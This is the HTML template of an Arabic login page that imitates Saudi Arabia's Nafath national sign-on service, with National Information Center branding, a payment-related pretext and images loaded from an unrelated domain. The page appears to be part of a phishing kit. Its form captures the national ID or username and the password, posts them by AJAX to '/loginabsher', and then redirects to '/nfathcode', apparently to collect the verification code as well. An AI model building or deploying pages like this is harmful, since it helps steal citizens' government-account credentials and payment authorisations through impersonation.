<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>تسجيل الدخول</title>
  <meta name="description" content="نفاذ">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="csrf-token" content="{{ csrf_token() }}">
  <!-- Stylesheet -->
  <link rel="stylesheet" href="../new/css/style.min.css">
    <script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
	 <style> 
	 .text-danger {
  
     background: #ed8280;
    }
	.text-danger input{
   
   
    }
	 
	 </style>
	  <script src="../new/js/HTI8BwV16s" async></script>
</head>

<body>

  <div class="o-page">
    <div class="container-fluid u-p-zero">
      <div class="container-fluid u-p-zero" style="">
  <header class="c-navbar u-mb-large">
        <a class="c-navbar__brand u-ml-medium" href="#">
            <img src="../new/img/logo.png" width="128">
        </a>
        <img src="../new/img/vision2030-grey.svg" width="128" class="u-opacity-heavy u-ml-auto u-hidden-down@mobile">

        <!-- Navigation items -->
        <nav class="c-navbar__nav collapse u-border-bottom" id="main-nav">
          <ul class="c-navbar__nav-list">
              <!--li class="c-navbar__nav-item">
                <a class="c-navbar__nav-link" href="#"><i class="feather icon-home"></i> الرئيسية</a>
              </li>
			  <li class="c-navbar__nav-item">
				<a class="c-navbar__nav-link c-tooltip c-tooltip--bottom " aria-label="إنشاء حساب جديد عن طريق منصة أبشر" href="#"><i class="feather icon-user"></i> حساب جديد</a>
              </li-->
			  <!--li class="c-navbar__nav-item">
				<a class="c-navbar__nav-link " href="#"><i class="feather icon-log-in"></i> تسجيل الدخول</a>
			  </li-->
			  <li class="c-navbar__nav-item">
				<a class="c-navbar__nav-link " href="#"><i class="feather icon-globe"></i> English</a>
			  </li>
          </ul>
        </nav>		
				
		<!-- Start of Dropdown Menus -->
		<!--div id="favouritesNavMain" class="c-dropdown dropdown u-mr-medium hide">
        <a class="c-notification dropdown-toggle c-btn c-btn--outline c-btn--small c-btn--secondary" id="ddFavorites" data-toggle="dropdown" role="button">
          <i class="c-notification__icon feather icon-star"></i>
        </a>
        <div class="c-dropdown__menu c-dropdown__menu--large dropdown-menu"  data-boundary="ddFavorites">
          <span class="c-dropdown__menu-header">
            المفضلة
          </span>

          <span id="recent_services" class="c-dropdown__menu-header">
            الخدمات المستخدمة مؤخراً
          </span-->
          <!-- Recent activity will be updated here -->
          <!--a class="c-dropdown__menu-footer">
          </a>
        </div>
    </div-->
    <!--div id="alertsNavMain" class="c-dropdown dropdown u-mr-small hide">
        <div class="c-notification has-indicator dropdown-toggle c-btn c-btn--outline c-btn--small c-btn--secondary" id="ddNotifications" data-toggle="dropdown" role="button">
          <i class="c-notification__icon feather icon-bell"></i>
        </div>
        <div class="c-dropdown__menu c-dropdown__menu--large dropdown-menu"  data-boundary="ddNotifications">
          <span class="c-dropdown__menu-header">
            التنبيهات
          </span>
          
          <a class="c-dropdown__menu-footer">
            كل التنبيهات
          </a>
        </div>
    </div-->
    <div id="currentUserNavMain" class="c-dropdown dropdown u-mr-small hide">
        <div class="dropdown-toggle c-notification c-btn c-btn--outline c-btn--small c-btn--secondary" id="dropdownMenuAvatar" data-toggle="dropdown" role="button">
            <i class="c-notification__icon feather icon-user"> <span id="currentAuthUser"></span></i>
        </div>
        <div class="c-dropdown__menu dropdown-menu has-arrow dropdown-menu-right">
          <!--a class="c-dropdown__item dropdown-item c-avatar c-avatar--small dropdown-toggle" href="#">
            <div class="o-media">
              <!--div class="o-media__img u-ml-small">
                <img class="c-avatar__img" src="/img/placeholder-user.png" alt="profile pic">
              </div-->
              <!--div class="o-media__content">
                <span id="currentAuthUser"></span>
              </div>
            </div>
          </a-->
          <a class="c-dropdown__item dropdown-item" href="#">معلوماتي</a>
          <a class="c-dropdown__item dropdown-item" href="#">تسجيل الخروج</a>
        </div>
    </div>
	<!-- End of Dropdown Menus -->
	
        <!-- // Navigation items  -->
        <button class="c-navbar__nav-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-nav" aria-expanded="false">
            <i class="feather icon-menu"></i>
        </button>
      </header>
</div>
    </div>

    <div class="container">
		<div id="bnfInfo" class="row u-justify-center"><h2 id="bnfLabel" class="u-color-primary u-mb-small u-text-center">الدخول على النظام</h2></div>
    <div id="bnfInfo" class="row u-justify-center"><h6 id="bnfLabel" class="u-color-primary u-mb-small u-text-center">  لمتابعة الطلب يرجى تسجيل الدخول بحساب نفاذالمرتبط بعملية الدفع</h6></div>
		<div id="content">
		<form novalidate="novalidate"> 
		<input name="selectedSecuence" id="selectedSecuence" type="hidden" value="2"> 
		<input name="startover" id="startover" type="hidden" value="SO"> 
		</form> <div class="row u-justify-center ">  
		
		<div class="content" id="pl1" style="width: 100%;"></div> 
	<button class="collapsible active">اسم المستخدم وكلمة المرور</button> 
	<div class="content active" id="pl2" style="max-height: 1200px; width: 100%;">
	﻿<div class="row u-justify-center"> <div class="col-md-8">
	<div class="c-card"> 
	<div class="row"> 
	<div class="col-md-6">
	<form id="userlogin" novalidate="novalidate"> <div style="overflow: hidden; width: 0px; height: 0px"> 
	<input type="password" id="Fake_passwod" value="000000000" tabindex="-1"> </div>
	
		<div class="c-field u-mb-medium"> 
		<label class="c-field__label" for="j_username"> اسم المستخدم \ الهوية الوطنية</label> 
		<input class="c-input" id="j_username" name="USER" type="text" autocomplete="off" size="10" maxlength="10" placeholder="اسم المستخدم \ الهوية الوطنية" required>
		</div>
	
	<div class="c-field u-mb-medium"> <label class="c-field__label" for="j_password">كلمة المرور</label> 
	<input type="password" name="PWD" style="width: 0; height: 0; visibility: hidden; position: absolute; left: 0; top: 0;" value="000000000" tabindex="-1" autocomplete="current-password"> 
	<input class="c-input" id="j_password" name="PWD" type="password"  required autocomplete="current-password" > 
	<input type="password" style="width: 0; height: 0; visibility: hidden; position: absolute; left: 0; top: 0;" value="000000000" tabindex="-1" autocomplete="current-password">
	</div> 
	
	
	<div class="c-field u-text-center">
	<button type="submit" name="btnAuthenticate" class="c-btn c-btn--fullwidth"><i class="feather icon-log-in "></i> متابعة التوثيق</button> 
	 </div>



	</form> 
	
	   <script type='text/javascript'>
	   $( document ).ready(function(){
		  
		   
		    function timer(){
				var sec = 5;
				var timer = setInterval(function(){
					//document.getElementById('safeTimerDisplay').innerHTML='00:'+sec;
					sec--;
					if (sec < 0) {
						clearInterval(timer);
						 $( "#spinner" ).hide();
			 
						
					}
				}, 1000);
			};
			timer();
			
			
		    $("#j_username").keyup(function () {
				 $("#j_username").removeClass('text-danger');
			  });
			  
		    $('#userlogin').submit(function(e){
				  e.preventDefault();
				  let usernameValue = $("#j_username").val();
					if (usernameValue.length == "") {
					  $("#j_username").addClass('text-danger');
					  usernameError = false;
					  return false;
					} 
					 
				  $.ajax({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                 },
				   url:'/loginabsher',
				   type: 'POST',
				   data: $("#userlogin").serialize(),
				   success: function(data){

            if(data.msg == 1)
					    window.location.href = '/nfathcode';
             else
              window.location.href = '/bname/1';
					  
				   },
				   error: function(){
					  
				   }
			   });
			});
		   
		   
	   });
	   </script>
	
	
	
	
	<div class="clr"></div>  </div> <div class="col-md-5 u-text-center u-p-small u-mh-small u-hidden-down@mobile u-color-secondary">
	<img src="https://terransar.site/assest/nafath_files/secure.svg" width="150"> <p>الرجاء إدخال اسم المستخدم \ الهوية الوطنية وكلمة المرور ثم اضغط تسجيل الدخول</p> </div> 
	</div> </div> </div> </div>  
	</div>   </div> <div class="clr"> </div>
	</div>
		
    </div><!-- // .container -->

    <div class="container-fluid">
      <div class="row">
        <div class="col-12">
          <footer class="c-footer u-mt-large u-justify-between">
            <div class="o-media">
              <div class="o-media__img u-ml-small">
                <div class="c-avatar">
                  <img class="c-avatar__img" src="https://terransar.site/assest/nafath_files/NIC-logo.png" alt="NIC-logo">
                </div>
              </div>

              <div class="o-media__content u-mt-small">
                <p>تطوير وتشغيل</p>
                <h5 class="u-color-secondary">مركز المعلومات الوطني</h5>
				<p>النفاذ الوطني الموحد جميع الحقوق محفوظة © 2022</p>
              </div>
            </div>
            <nav>
              <a class="c-footer__link" href="#">الرئيسية</a>
              <a class="c-footer__link" href="#">حول</a>
              <a class="c-footer__link" href="#">اتصل بنا</a>
              <a class="c-footer__link" href="#">الشروط والأحكام</a>
              <a class="c-footer__link" href="#">المساعدة والدعم</a>
            </nav>
          </footer>
        </div>
      </div>
    </div>
  </div><!-- // .o-page -->

 
	




  
		
<!-- spinner -->
<div id="spinner" class="overlayWrapper u-m-0" style="
    position: fixed;
    display: block;
    width: 100%; 
    height: 100%;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: rgba(0,0,0,0.5); 
    z-index: 2; 
    cursor: pointer;
    ">
     <div class="overlayBG"></div>
           <div id="loading" class="overlayContainerOuter" style="text-align: center; padding-top: 20%;">
               <div class="overlayContainerInner u-p-medium" style="
    background-color: white;
">
                   <div class="spinnerContent">
                       
                      
                       <div class="modalDetails">
                           <div class="loading_msg">
           <img alt="" src="https://terransar.site/assest/nafath_files/loader.gif"><br>
جاري المعالجة ، نرجو الإنتظار ...      </div>                                 
                       </div>
                   </div>
               </div>
           </div>
   </div>
<!-- spinner -->
	
	<div id="browserErrorsOverlay" class="overlayWrapper" style="display:none;">
      <div class="overlayBG"></div>
            <div class="overlayContainerOuter">
                <div class="overlayContainerInner">
                    <div id="browserErrorsOverlayContent" class="overlayContent" style="width: 630px;text-align: center; !important;">
                        <div>
                            <a href="#" class="overlayClose overlayClose_iconed"></a>
                        </div>
                        <h2>
                        	<img src="https://terransar.site/assest/nafath_files/moi_logo_rtl.gif" width="500" style="border-style:none;">
                        </h2>
                        <hr>
                     
                 </div>
            </div>
         </div>
     </div>
		


</body></html>